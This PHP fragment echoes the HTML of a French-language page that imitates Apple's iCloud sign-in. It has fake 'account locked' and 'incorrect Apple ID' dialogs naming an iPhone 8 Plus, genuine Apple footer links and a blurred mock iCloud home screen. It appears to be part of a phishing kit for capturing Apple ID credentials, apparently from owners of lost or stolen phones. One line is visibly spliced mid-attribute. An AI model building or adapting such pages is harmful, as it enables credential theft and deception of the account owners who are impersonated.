echo "						<div class=\"si-forgot-password\">\n";
echo "							<a id=\"iforgot-link\" class=\"si-link ax-outline lite-theme-override\" href=\"https://iforgot.apple.com/password/verify/appleid\" target=\"_blank\">\n";
echo $lang["FORGOT_ID"];
echo "							    </a>\n";
echo "						</div>  \n";
echo "					</div>\n";
echo "				</div>\n";
echo "			  </div>\n";
echo "	  </sign-in></div>\n";
echo "		</div>\n";
echo "		<div id=\"stocking\" style=\"display:none !important;\"></div>\n";
echo "	</div>\n";
echo "	  </apple-auth></div>\n";
echo "	  <div aria-hidden=\"false\" id=\"locked_id\" class=\"idms-modal  dialog fade-in  \n";
echo "	  idms-modal-type-dialog\n";
echo "	  idms-modal-theme-translucent\n";
echo "	  idms-modal-role-alertdialog\n";
echo "	  hide\" aria-labelledby=\"alertInfo\" aria-describedby=\"idms-modal-describedby-1569957525902-0\" role=\"alertdialog\" tabindex=\"-1\" style=\"z-index: 100061;\">\n";
echo "	  <div class=\"idms-modal-dialog\">\n";
echo "		<div ($inserted)=\"focus()\" id=\"idms-modal-1569957525902-0\" class=\"idms-modal-content modal-content   \">\n";
echo "		  \n";
echo "	  <div class=\"app-dialog\" tabindex=\"-1\" style=\"outline: 0px;\">\n";
echo "		  <div class=\"head \">\n";
echo "			  <div class=\"title\" title-align=\"center\">\n";
echo "<h2 id=\"alertInfo\" class=\"tk-subsection-headline\">\n";
echo "Cet identifiant Apple a été verrouillé pour des raisons de sécurité\n";
echo "</h2>\n";
echo "			  </div>\n";
echo "		  </div>\n";
echo "		  <div class=\"body\" body-align=\"center\">\n";
echo "			  \n";
echo "		  <div class=\"acc-locked\" id=\"acc-locked\">\n";
echo "			  <div class=\"dialog-body\">\n";
echo "				  <div class=\"dialog-info\">\n";
echo "					  <div class=\"thin\">\n";
echo "Vous devez déverrouiller votre compte avant de vous connecter.\n";
echo "					  </div>\n";
echo "				  </div>\n";
echo "			  </div>\n";
echo "		  </div>\n";
echo "		  </div>\n";
echo "		  <div class=\"footer\">\n";
echo "			  <div class=\"button-bar\" btn-direction=\"center\">\n";
echo "				  <div class=\"dialog-spinner-container\" id=\"dialog-btn-spinner\"></div>\n";
echo "				  <button ax-outline=\"\" tabindex=\"0\" class=\"button click-handle   button-secondary\" id=\"go-back\">\n";
echo "Retour\n";
echo "				      </button> \n";
echo "				  <button ax-outline=\"\" tabindex=\"0\" class=\"button click-handle  \" id=\"unlock-account\" >\n";
echo "Déverrouiller\n";
echo "</button> \n";
echo "			  </div>\n";
echo "		  </div>\n";
echo "	  </div>\n";
echo "		  <div style=\"clear:both\"></div>\n";
echo "		</div>\n";
echo "	  </div>\n";
echo "	</div>\n";
echo "	<div aria-hidden=\"false\" id=\"blocked_id\" class=\"idms-modal  dialog fade-in  \n";
echo "	  idms-modal-type-dialog\n";
echo "	  idms-modal-theme-translucent\n";
echo "	  idms-modal-role-alertdialog\n";
echo "	  hide\" aria-labelledby=\"alertInfo\" aria-describedby=\"idms-modal-describedby-1569957525902-0\" role=\"alertdialog\" tabindex=\"-1\" style=\"z-index: 100061;\">\n";
echo "	  <div class=\"idms-modal-dialog\">\n";
echo "		<div ($inserted)=\"focus()\" id=\"idms-modal-1569957525902-0\" class=\"idms-modal-content modal-content   \">\n";
echo "		  \n";
echo "	  <div class=\"app-dialog\" tabindex=\"-1\" style=\"outline: 0px;\">\n";
echo "		  <div class=\"head \">\n";
echo "			  <div class=\"title\" title-align=\"center\">\n";
echo "				  <h2 id=\"alertInfo\" class=\"tk-subsection-headline\">\n";
echo "Identifiant Apple incorrect\n";
echo "</h2>\n";
echo "			  </div>\n";
echo "		  </div>\n";
echo "		  <div class=\"body\" body-align=\"center\">\n";
echo "			  \n";
echo "		  <div class=\"acc-locked\" id=\"acc-locked\">\n";
echo "			  <div class=\"dialog-body\">\n";
echo "				  <div class=\"dialog-info\">\n";
echo "					  <div class=\"thin\">\n";
echo "L'identifiant Apple\n";
echo "« <span id=\"text_blocked_id\">%appleid%</span> »\n";
echo "ne peut pas être utilisé pour localiser cet \n";
echo "					  <span style=\"white-space:nowrap\">\n";
echo "iPhone 8 Plus\n";
echo "					      </span>.\n";
echo "					  </div>\n";
echo "				  </div>\n";
echo "			  </div>\n";
echo "		  </div>\n";
echo "	  \n";
echo "		  </div>\n";
echo "		  <div class=\"footer\">\n";
echo "			  <div class=\"button-bar\" btn-direction=\"center\">\n";
echo "				  <div class=\"dialog-spinner-container\" id=\"dialog-btn-spinner\"></div>\n";
echo "				   \n";
echo "				  <button style = \"width:180px\" ax-outline=\"\" tabindex=\"0\" class=\"button click-handle  \" id=\"block-account\" >OK</button> \n";
echo "			  </div>\n";
echo "		  </div>\n";
echo "	  </div>\n";
echo "	\n";
echo "		  <div style=\"clear:both\"></div>\n";
echo "		</div>\n";
echo "	  </div>\n";
echo "	</div>\n";
echo "	\n";
echo "	  <div class=\"legal-footer\" id=\"legal-footer\" >\n";
echo "		<div class=\"legal-footer-content\" style=\"white-space: normal\">\n";
echo "		  <span><a class=\"create\" target=\"_blank\" href=\"#\">\n";
echo $lang["Create_Footer"];
echo "		      </a>  |  <a class=\"sytemStatus\" target=\"_blank\" href=\"https://www.apple.com/support/systemstatus/\">\n";
echo $lang["SYSTEM_STATUS"];
echo "		          </a>  |  <a class=\"privacy\" target=\"_blank\" href=\"https://www.apple.com/privacy/\">\n";
echo $lang["POLICY"];
echo "		              </a>  |  <a class=\"terms\" target=\"_blank\" href=\"https://www.apple.com/legal/icloud/ww/\">\n";
echo $lang["TERMS"];
echo "		                  </a>  |  <span class=\"copyright\">\n";
echo $lang["COPYRIGHT"];
echo "	  </div></div>\n";
echo "	  \n";
echo "	<div id=\"back_icons\" class=\"single-presenter-view cloudos-presenter-view multi-child-view fade-in\" style=\"position: absolute; z-index: -2\">\n";
echo "		<div class=\"child-views\">\n";
echo "			<div id=\"div1\" class=\"bootstrap-mock-springboard-view\" aria-hidden=\"true\" style=\"position: absolute; pointer-events: none; user-select: none; filter: blur(57px); z-index: -1; left: 0px; top: 44px;\">\n";
echo "			  <div id=\"div_icon\" style=\"position: absolute; width: 160px; height: 160px; border-radius: 50%; background-color: rgb(192, 192, 192); left: 880px; top: 105.082px;\"></div>\n";
echo "			  <div id=\"div_text_1\" style=\"position: absolute; font-family: SFDisplay, SFText, Helvetica, sans-serif; font-size: 26px; font-weight: 600; color: rgb(51, 51, 51); text-align: center; width: 290px; height: 31px; left: 815px; top: 282.082px;\">Good afternoon, Abcdef.</div>\n";
echo "			  <div id=\"div_text_2\" class=\"bootstrap-mock-account-settings\" style=\"position: absolute; font-family: SFText, Helvetica, sans-serif; font-size: 15px; font-weight: 500; color: rgb(4, 199, 255); text-align: center; width: 156px; height: 18px; left: 882px; top: 326.082px;\">Account Settings</div>\n";
echo "			  <style>.bootstrap-mock-springboard-view * { filter: contrast(0.65) brightness(1.2); }</style>\n";
echo "			  <div id=\"icon_1\" style=\"position: absolute; border-radius: 20%; height: 155.28px; width: 119.4px; left: 437.625px; top: 428.147px; background-color: rgb(102, 188, 249);\">\n";
echo "				<div style=\"position: absolute; bottom: -10px; left: 50%; transform: translateX(-50%) translateY(100%); font-family: SFText, Helvetica, sans-serif; font-size: 13px; font-weight: 400; color: #333; white-space: nowrap;\">Mail</div></div>\n";
echo "				<div id=\"icon_2\" style=\"position: absolute; border-radius: 20%; height: 155.28px; width: 119.4px; left: 622.695px; top: 428.147px; background-color: rgb(204, 204, 191);\">\n";
echo "				  <div style=\"position: absolute; bottom: -10px; left: 50%; transform: translateX(-50%) translateY(100%); font-family: SFText, Helvetica, sans-serif; font-size: 13px; font-weight: 400; color: #333; white-space: nowrap;\">Contacts</div></div>\n";
echo "				<div id=\"icon_3\" style=\"position: absolute; border-radius: 20%; height: 155.28px; width: 119.4px; left: 807.765px; top: 428.147px; background-color: rgb(239, 232, 231);\">\n";
echo "				  <div style=\"position: absolute; bottom: -10px; left: 50%; transform: translateX(-50%) translateY(100%); font-family: SFText, Helvetica, sans-serif; font-size: 13px; font-weight: 400; color: #333; white-space: nowrap;\">Calendar</div></div>\n";
echo "				<div id=\"icon_4\" style=\"position: absolute; border-radius: 20%; height: 155.28px; width: 119.4px; left: 992.835px; top: 428.147px; background-color: rgb(208, 196, 179);\">\n";
echo "				  <div style=\"position: absolute; bottom: -10px; left: 50%; transform: translateX(-50%) translateY(100%); font-family: SFText, Helvetica, sans-serif; font-size: 13px; font-weight: 400; color: #333; white-space: nowrap;\">Photos</div></div>\n";
echo "				  <div id=\"icon_5\" style=\"position: absolute; border-radius: 20%; height: 155.28px; width: 119.4px; left: 1177.9px; top: 428.147px; background-color: rgb(201, 232, 252);\">\n";
echo "					<div style=\"position: absolute; bottom: -10px; left: 50%; transform: translateX(-50%) translateY(100%); font-family: SFText, Helvetica, sans-serif; font-size: 13px; font-weight: 400; color: #333; white-space: nowrap;\">iCloud Drive</div></div>\n";
echo "					<div id=\"icon_6\" style=\"position: absolute; border-radius: 20%; height: 155.28px; width: 119.4px; left: 1362.97px; top: 428.147px; background-color: rgb(251, 241, 203);\">\n";
echo "					  <div style=\"position: absolute; bottom: -10px; left: 50%; transform: translateX(-50%) translateY(100%); font-family: SFText, Helvetica, sans-serif; font-size: 13px; font-weight: 400; color: #333; white-space: nowrap;\">Notes</div></div>\n";
echo "					  <div id=\"icon_7\" style=\"position: absolute; border-radius: 20%; height: 155.28px; width: 119.4px; left: 437.625px; top: 637.097px; background-color: rgb(246, 249, 245);\">\n";
echo "						<div style=\"position: absolute; bottom: -10px; left: 50%; transform: translateX(-50%) translateY(100%); font-family: SFText, Helvetica, sans-serif; font-size: 13px; font-weight: 400; color: #333; white-space: nowrap;\">Reminders</div></div>\n";
echo "						<div id=\"icon_8\" style=\"position: absolute; border-radius: 20%; height: 155.28px; width: 119.4px; left: 622.695px; top: 637.097px; background-color: rgb(255, 170, 30);\">\n";
echo "						  <div style=\"position: absolute; bottom: -10px; left: 50%; transform: translateX(-50%) translateY(100%); font-family: SFText, Helvetica, sans-serif; font-size: 13px; font-weight: 400; color: #333; white-space: nowrap;\">Pages</div></div>\n";
echo "						  <div id=\"icon_9\" style=\"position: absolute; border-radius: 20%; height: 155.28px; width: 119.4px; left: 807.765px; top: 637.097px; background-color: rgb(125, 239, 120);\">\n";
echo "							
eight: 155.28px; width: 119.4px; left: 1177.9px; top: 637.097px; background-color: rgb(255, 193, 55);\">\n";
echo "							  <div style=\"position: absolute; bottom: -10px; left: 50%; transform: translateX(-50%) translateY(100%); font-family: SFText, Helvetica, sans-serif; font-size: 13px; font-weight: 400; color: #333; white-space: nowrap;\">Find Friends</div></div>\n";
echo "							  <div id=\"icon_12\" style=\"position: absolute; border-radius: 20%; height: 155.28px; width: 119.4px; left: 1362.97px; top: 637.097px; background-color: rgb(121, 169, 129);\">\n";
echo "								<div style=\"position: absolute; bottom: -10px; left: 50%; transform: translateX(-50%) translateY(100%); font-family: SFText, Helvetica, sans-serif; font-size: 13px; font-weight: 400; color: #333; white-space: nowrap;\">Find iPhone</div></div>\n";
echo "							  </div>\n";
echo "										<div class=\"content-container-view\">\n";
echo "											<div class=\"content\" style=\"margin-top: 44px;\">\n";
echo "												<div class=\"child-views\">\n";
echo "													<div class=\"home-login-view\">\n";
echo "														<div class=\"notice-view-container\"><div></div></div>\n";
echo "														<div class=\"container-view\">\n";
echo "															<div class=\"cloud-os-apple-id-view\">   \n";
echo "																<div class=\"view-visible\">       \n";
echo "																	<div class=\"apple-id-view apple-id-ui-view\"><div></div>div>\n";
echo "																  </div>   \n";
echo "																  </div>   <canvas class=\"cw-spinner-view\" height=\"64\" width=\"64\" style=\"height: 32px; width: 32px; display: none;\"></canvas></div></div><div class=\"quick-access-view hide-quick-access-view\"><div></div></div></div></div>\n";
echo "																</div></div></div></div>\n";
echo "																		\n";
echo "</script>\n";
echo " <script src=\"css3/footer.js\"></script>\n";
echo "	  </body>\n";
echo "	  </html>";
*/
?>